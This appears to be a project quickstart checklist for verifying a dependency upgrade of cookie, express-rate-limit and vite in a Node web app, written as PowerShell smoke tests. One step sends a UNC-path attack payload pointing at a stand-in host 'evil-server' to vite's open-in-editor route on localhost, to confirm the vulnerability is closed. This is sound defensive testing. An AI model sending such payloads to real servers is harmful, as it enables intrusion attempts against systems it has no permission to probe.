# Quickstart: Verifying the Dependency Upgrade

Runnable verification for feature 002-dep-upgrade. This is the fixed smoke checklist the consilium
required instead of an undefined "manual run". Run the relevant part after EACH of the two commits;
run all of it before calling the feature done. Commands are PowerShell (Windows dev machine).

## Prerequisites

- Node >= 22.12 (`node --version`; dev machine has 22.14.0).
- Dependencies installed per workspace (`npm install` in `server/` and `client/`).
- For prod-served mode: `JWT_SECRET` and `ADMIN_PASSWORD` env vars set (server throws on boot
  without them in production).

## Baseline (recorded 2026-07-10, before any change)

- Client bundle: one JS chunk 350082 B raw / 109070 B gzip; CSS 24863 B raw / 5082 B gzip.
- `npm audit`: client - 2 findings (1 high, 1 moderate); server - 1 low.

## After commit 1 (server: cookie ^0.7.2, express-rate-limit ^8)

1. Tree is clean of the vulnerable cookie:

   ```powershell
   Set-Location server; npm ls cookie   # expect: no 0.6.0 anywhere
   npm audit                            # expect: found 0 vulnerabilities
   npm run typecheck; npm run build
   ```

2. Server boots cleanly (v8 validates `trust proxy` config at startup - a config error prints a
   startup warning/error):

   ```powershell
   npm run dev                          # from server/; expect clean start, no ERL warnings
   ```

3. Rate limit still bites, with the same window as before: 11 login attempts inside a minute ->
   the 11th returns 429.

   ```powershell
   1..11 | ForEach-Object {
     try { Invoke-WebRequest -Uri http://localhost:3001/api/auth/login -Method POST `
       -ContentType 'application/json' -Body '{"username":"viewer","password":"wrong"}' | Out-Null
       "attempt $_ : ok" }
     catch { "attempt $_ : $($_.Exception.Response.StatusCode.value__)" }
   }
   # expect: attempts 1-10 -> 401, attempt 11 -> 429
   ```

4. Normal session flow: login via UI, cookie set (httpOnly), an admin mutation succeeds, logout.

## After commit 2 (client: vite 7.3.6 + plugin-react ^5; root engines >=22.12)

1. Audit and typecheck:

   ```powershell
   Set-Location client; npm audit       # expect: found 0 vulnerabilities
   npm run typecheck
   ```

2. The active vector is closed. `npm ls launch-editor` is empty because vite now bundles it inside
   its own `dist/node` output, not because the route disappeared - the route still responds. What
   matters is that the UNC-path payload never reaches the vulnerable call:

   ```powershell
   npm ls launch-editor                 # expect: (empty) - bundled inside vite, see research.md R1
   # with dev server running, plain request (route still exists, this is NOT the security check):
   Invoke-WebRequest http://localhost:5173/__open-in-editor?file=x
   # the actual check - send the real attack payload (a UNC path); expect a 500 raised by
   # launch-editor's own UNC guard BEFORE any filesystem/network call, not a successful launch:
   Invoke-WebRequest ("http://localhost:5173/__open-in-editor?file=" + [uri]::EscapeDataString("\\evil-server\share\x"))
   ```

3. Dev-mode smoke (vite proxy + websocket): `npm run dev` at repo root; open the app, log in,
   change a match score in admin, watch it update live on a viewer tab (socket path through the
   vite proxy is the point being tested).

4. `client/vite.config.ts` diff is EMPTY (in particular `server.fs` and `host` untouched). If the
   build only goes green by widening them - stop, revert, investigate.

5. Prod-served smoke (this branch of the server only exists in production mode):

   ```powershell
   npm run build                        # repo root: builds server + client
   $env:NODE_ENV='production'; $env:JWT_SECRET='...'; $env:ADMIN_PASSWORD='...'
   npm run start
   ```

   Checklist against the prod server:
   - login works; live score update reaches a second browser tab;
   - deep link (e.g. `/ko/R8M0`) served the app shell directly;
   - `Invoke-WebRequest http://localhost:3001/api/health` -> JSON, not HTML;
   - `Invoke-WebRequest http://localhost:3001/api/does-not-exist` -> JSON error, NOT index.html;
   - admin tournament import of a file > 16KB succeeds (route-scoped 1MB limit intact);
   - a ~17KB body on an ordinary mutation route -> 413 (global 16KB cap intact);
   - tournament export downloads.

6. Bundle size vs baseline (raw and gzip):

   ```powershell
   Set-Location client
   $js = Get-ChildItem dist/assets/index-*.js
   node -e "const z=require('node:zlib'),f=require('node:fs');const b=f.readFileSync(process.argv[1]);console.log('raw',b.length,'gzip',z.gzipSync(b,{level:9}).length)" $js.FullName
   # compare against baseline: raw 350082 / gzip 109070; weigh any regression before keeping
   ```

## Rollback

Any failed step above = the commit's rollback criterion. Rollback is `git revert` of the offending
commit; reverting commit 2 returns to vite 5.4.21, which reopens nothing beyond the advisories
already present today (the reason a plain revert is an acceptable fallback).

## Done when

- Both audits report 0 vulnerabilities; typecheck and build green in both workspaces.
- Every checklist item above passes in dev AND prod-served modes.
- Bundle delta vs baseline recorded (and acceptable).
- Two commits exist, each confirmed by the user before it was made.
